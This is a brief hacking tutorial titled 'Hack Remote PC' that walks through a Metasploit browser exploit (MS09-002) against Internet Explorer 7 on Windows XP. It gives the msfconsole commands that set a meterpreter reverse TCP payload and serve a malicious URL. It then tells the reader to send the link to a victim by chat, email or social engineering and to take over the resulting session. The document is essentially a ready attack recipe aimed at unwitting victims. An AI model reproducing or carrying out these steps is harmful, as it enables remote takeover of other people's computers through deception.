Hack Remote PC using Internet Explorer 7 CFunction Pointer Uninitialized Memory Corruption

This module exploits an error related to the CFunctionPointer function when attempting to access uninitialized memory. A remote attacker could exploit this vulnerability to corrupt memory and execute arbitrary code on the system with the privileges of the victim.
Windows XP service pack 2
Windows XP service pack 3
Internet Explorer 7
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/browser/ms09_002_memory_corruption
Msf exploit (ms09_002_memory_corruption)>set payload windows/meterpreter/reverse_tcp
Msf exploit (ms09_002_memory_corruption)>set lhost 192.168.1.2 (IP of Local Host)
Msf exploit (ms09_002_memory_corruption)>set srvhost 192.168.1.2 (This must be an address on the local machine)
Msf exploit (ms09_002_memory_corruption)>set uripath memory (The Url to use for this exploit)
Msf exploit (ms09_002_memory_corruption)>exploit

Now an URL you should give to your victim http://192.168.1.2:8080/memory

Send the link of the server to the victim via chat or email or any social engineering technique.
Now you have access to the victims PC. Use “Sessions -l” and the Session number to connect to the session. And Now Type “sessions -i ID“
